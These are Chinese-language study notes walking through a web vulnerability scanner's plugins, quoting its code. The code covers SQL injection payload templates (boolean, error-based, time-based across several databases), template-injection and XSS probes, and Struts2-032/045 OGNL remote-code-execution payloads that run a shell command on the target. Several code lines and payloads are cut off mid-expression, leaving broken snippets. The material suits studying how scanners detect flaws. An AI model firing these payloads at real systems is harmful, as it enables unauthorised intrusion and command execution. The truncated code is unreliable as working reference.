count += 1 
开始准备插入payload测试
payload
sql_payload = [
    "", 
    "'and'{0}'='{1}", 
    '"and"{0}"="{1}', 
    " and '{0}'='{1}-- ", 
    "' and '{0}'='{1}-- ", 
    '''" and '{0}'='{1}-- ''', 
    ") and '{0}'='{1}-- ", 
    "') and '{0}'='{1}-- ", 
    '''") and '{0}'='{1}-- ''' 
] 
闭合单双引号加括号 然后 用and等于随机数 最后注释
如果有参数中有  desc 或者 asc  可能可以使用order by 
payload增加一条  ,if('{0}'='{1}',1,(select 1 from information_schema.tables)) 
默认是不是数字的 判断一下value值是否是数字 是的话 is_num设置为True
for payload in temp_sql_flag: 
    is_num = False 
    if payload == "": 
        if str(v).isdigit(): 
            is_num = True 
        else: 
            continue 
开始生成payload 
获取false的 
如果是数字的直接是  v/0  
否则是两个随机字符串拼接到payload模块里 
这里如果随机出来的一样再次随机直到不一样为止
获取true的 
如果是数字的直接  v/1  
否则就是随机字符串1 与随机字符串1拼接到模板里 相等即为true
def generatePayloads(self, payloadTemplate, v, is_num=False): 
    ''' 
    根据payload模板生成布尔盲注所需要的True 和 False payload 
    :param payloadTemplate: 
    :return: 
    ''' 
    if is_num: 
        payload_false = "{}/0".format(v) 
    else: 
        str1 = random_str(2) 
        str2 = random_str(2) 
        while str1 == str2: 
            str2 = random_str(2) 
        payload_false = v + payloadTemplate.format(str1, str2) 
    rand_str = random_str(2) 
    if is_num: 
        payload_true = "{}/1".format(v) 
    else: 
        payload_true = v + payloadTemplate.format(rand_str, rand_str) 
    return payload_true, payload_false 
sqli_error 报错注入
报错注入的payload模板
num = random_num(4) 
s = random_str(4) 
_payloads = [ 
    '𫟿\'"\(', 
    "'", "')", "';", '"', '")', '";', ' order By 500 ', "--", "-0", 
    ") AND {}={} AND ({}={}".format(num, num + 1, num, num), 
    " AND {}={}%23".format(num, num + 1), 
    " %' AND {}={} AND '%'='".format(num, num + 1), " ') AND {}={} AND ('{}'='{}".format(num, num + 1
    " ' AND {}={} AND '{}'='{}".format(num, num + 1, s, s), 
    '`', '`)', 
    '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C", 
    "extractvalue(1,concat(char(126),md5({})))".format(random_num), 
    "convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','{}')))".format(random_num) 
] 
然后将payload 写到参数里请求 使用  Get_sql_errors  遍历判断数据库类型
里面都是类似这种的  errors.append(('System\.Data\.OleDb\.OleDbException', DBMS.MSSQL)) 
然后再用正则匹配下报错信息  sensitive_page_error_message_check  
匹配上了的话就输出结果
sqli_time 时间注入
padyload模板
sleep time 是5s
    sleep_time = 5 
    sleep_str = "[SLEEP_TIME]" 
生成payload 
这里是把  [SLEEP_TIME]  换成 sleep_time 即5s 
生成了两个一个是5s的一个是0s的
num = random_num(4) 
sql_times = { 
    "MySQL": ( 
        " AND SLEEP({})".format(self.sleep_str), 
        " AND SLEEP({})--+".format(self.sleep_str), 
        "' AND SLEEP({})".format(self.sleep_str), 
        "' AND SLEEP({})--+".format(self.sleep_str), 
        "' AND SLEEP({}) AND '{}'='{}".format(self.sleep_str, num, num), 
        '''" AND SLEEP({}) AND "{}"="{}'''.format(self.sleep_str, num, num)), 
    "Postgresql": ( 
        "AND {}=(SELECT {} FROM PG_SLEEP({}))".format(num, num, self.sleep_str), 
        "AND {}=(SELECT {} FROM PG_SLEEP({}))--+".format(num, num, self.sleep_str), 
    ), 
    "Microsoft SQL Server or Sybase": ( 
        " waitfor delay '0:0:{}'--+".format(self.sleep_str), 
        "' waitfor delay '0:0:{}'--+".format(self.sleep_str), 
        '''" waitfor delay '0:0:{}'--+'''.format(self.sleep_str)), 
    "Oracle": (
        " and 1= dbms_pipe.receive_message('RDS', {})--+".format(self.sleep_str), 
        "' and 1= dbms_pipe.receive_message('RDS', {})--+".format(self.sleep_str), 
        '''"  and 1= dbms_pipe.receive_message('RDS', {})--+'''.format(self.sleep_str), 
        "AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),{})".format(self.sl
        "AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),{})--+".format( 
            self.sleep_str), 
    ) 
} 
def generatePayloads(self, payloadTemplate, origin_dict): 
    """ 
    根据payload模板生成时间盲注所需要的不同响应时间的payload 
    @param payloadTemplate: 
    @param origin_dict: 
    @return: 
    """ 
    new_dict = origin_dict.copy() 
    zero_dict = origin_dict.copy() 
    for k, v in new_dict.items(): 
        new_dict[k] = v + payloadTemplate.replace(self.sleep_str, str(self.sleep_time)) 
        # 如果取 2*sleep_time 可能会更准确 
        zero_dict[k] = v + payloadTemplate.replace(self.sleep_str, "0") 
    return new_dict, zero_dict 
这两个都发起请求测试并计时
如果sleep 5s的响应时间大于5s 并且 sleep 5s的响应时间大于sleep 0s的响应时间 这里计算了时间相差 
sleep5s的响应时间 - sleep0s的响应时间 保留小数点后两位
计算相差时间  delta = round(delta1 - delta0, 3)  
这里的时间差用的是随机 本来的时间差到3中取值 这块不是很理解 ???
默认是验证两次即会测试两次来确认
ssti ssti模板注入探测
先从响应页面中获取表单参数
解析html 
如果标签是input 获取绑定的key和value 
如果key的值是name 那么result加入这个value值 
如果是script 那么获取里面的值并且使用  pyjsparser 解析这段js代码获取body
def getParamsFromHtml(html): 
    parse = MyHTMLParser() 
    parse.feed(html) 
    tokens = parse.getTokenizer() 
    result = set() 
    for token in tokens: 
        tagname = token["tagname"].lower() 
        if tagname == "input": 
            for attibute in token["attibutes"]: 
                key, value = attibute 
                if key == "name": 
                    result.add(value) 
                    break 
        elif tagname == "script": 
            content = token["content"] 
            try: 
                nodes = pyjsparser.parse(content).get("body", []) 
            except pyjsparser.pyjsparserdata.JsSyntaxError as e: 
                return [] 
            result |=set(analyse_js(nodes)) 
    return list(result) 
通过解析js获取里面key是name的value值 
如果是list递归解析
def analyse_js(node) -> list: 
    if isinstance(node, dict): 
        r = [] 
        if node.get("type") == "VariableDeclarator": 
            id = node.get("id", {}) 
            if isinstance(id, dict): 
                if id.get("type") == "Identifier": 
                    r.append(id["name"]) 
        for key, value in node.items(): 
            dd = analyse_js(value) 
            r.extend(dd) 
        return r 
    elif isinstance(node, list): 
        r = [] 
        for item in node: 
            r.extend(analyse_js(item)) 
        return r 
    return [] 
寻找html标签里里和javascript里name的value 是在响应页面里找
事例   
他会获取到username 这个其实是发送数据的key
先生成随机字符串写到这个key的value里
如果随机字符串存在响应中就继续测试ssti
payload模板 计算两个数字的乘积
payloads = [ 
    "{%d*%d}", 
    "", 
    "#{%d*%d}", 
    "${{%d*%d}}", 
    "{{%d*%d}}", 
    "{{= %d*%d}}", 
    "", 
    "{@%d*%d}", 
    "[[%d*%d]]", 
    "${{\"{{\"}}%d*%d{{\"}}\"}}", 
] 
会发起三次测试
不编码请求  self.req(positon, url_dict2str(data, positon))  
url编码请求  self.req(positon, data)  
html编码请求
data[k] = html.escape(data[k]) 
r1 = self.req(positon, data) 
都去判断两个随机数字的乘积是否存在到响应的页面中
struts2_032 Struts2-032远程代码执行
直接打payload在data中
if self.requests.method == HTTPMETHOD.GET: 
    parse_params = (parse_params | TOP_RISK_GET_PARAMS) - set(self.requests.params.keys()) 
    for key in parse_params: 
        params_data[key] = random_str(6) 
    params_data.update(self.requests.params) 
    resp = requests.get(self.requests.netloc, params=params_data, headers=self.requests.headers).text
    iterdatas = self.generateItemdatas(params_data) 
elif self.requests.method == HTTPMETHOD.POST: 
    parse_params = (parse_params) - set(self.requests.post_data.keys()) 
    for key in parse_params: 
        params_data[key] = random_str(6) 
    params_data.update(self.requests.post_data) 
    resp = requests.post(self.requests.url, data=params_data, headers=self.requests.headers).text 
    iterdatas = self.generateItemdatas(params_data) 
然后检测响应是否存在
checks = [str(ran_check), '无法初始化设备 PRN', '??????? PRN', '', 
            'Unable to initialize device PRN'] 
存在则输出结果
struts2_045 Struts2-045远程代码执行
payload写到请求头的  Content-Type 里
发起请求 timeout设置为30s   
for payload in payloads: 
    headers['Content-Type'] = payload 
    r = requests.get(self.requests.url, headers=headers,timeout=30) 
    html1 = r.text 
然后检验的字符串  check = '' 
unauth 未授权访问探测插件
先判断请求头里是否有以下字段  ["cookie", "token", "auth"]  
有的话才继续进行判断
然后测试如果删除了 cookie token auth是否换访问 
访问的页面与之前正常访问的相似度是多少来判断是否有未授权访问
ran_a = random.randint(10000000, 20000000) 
ran_b = random.randint(1000000, 2000000) 
ran_check = ran_a - ran_b 
lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b) 
checks = [str(ran_check), '无法初始化设备 PRN', '??????? PRN', '', 
            'Unable to initialize device PRN'] 
payloads = [ 
    r"method%3a%23_memberAccess%3d@ognl.OgnlContext+@DEFAULT_MEMBER_ACCESS%2c%23kxlzx%3d+@org.apache.
        ran_a) + '-' + str(ran_b) + "%29%2c%23kxlzx.close", 
    r"method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts
    r"method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts
    r"method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts
] 
payloads = [ 
    r"%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess
    r"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(
    r'''%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess
] 
webpack webpack源文件泄漏
先过滤需要 js后缀 然后拼接url 后面加  .map  
再次访问如果返回状态码是 200 并且页面含有  webpack:///  
则说明是 webpack源文件泄漏
if self.requests.suffix.lower() == '.js': 
    new_url = self.requests.url + ".map" 
    req = requests.get(new_url, headers=self.requests.headers) 
    if req.status_code == 200 and 'webpack:///' in req.text: 
        result = ResultObject(self) 
        result.init_info(self.requests.url, "webpack源文件泄漏", VulType.SENSITIVE) 
        result.add_detail("payload探测", req.reqinfo, generateResponse(req), 
                            "webpack:/// 在返回文本中", "", "", PLACE.GET) 
        self.success(result) 
xss XSS语义化探测
这里不是单纯的正则匹配 是语法语义解析的
先通过响应体获取可以测试的标签 跟ssti一个方法 
而且也是同样的做法判断这个标签的value值是否会回显到响应体里
找回显位置
# 探测回显 
xsschecker = "0x" + random_str(6, string.digits + "abcdef") 
data[k] = xsschecker 
r1 = self.req(positon, data) 
if not re.search(xsschecker, r1.text, re.I): 
    continue 
html_type = r1.headers.get("Content-Type", "").lower() 
XSS_LIMIT_CONTENT_TYPE = conf.XSS_LIMIT_CONTENT_TYPE 
if XSS_LIMIT_CONTENT_TYPE and 'html' not in html_type: 
    continue 
# 反射位置查找 
locations = SearchInputInResponse(xsschecker, r1.text) 
SearchInputInResponse 解析html查找回显位置
先判断input回显是在 tagname content 中否则就判断是name还是value 
返回解析的位置 token
def SearchInputInResponse(input, body): 
    parse = MyHTMLParser() 
    parse.feed(body) 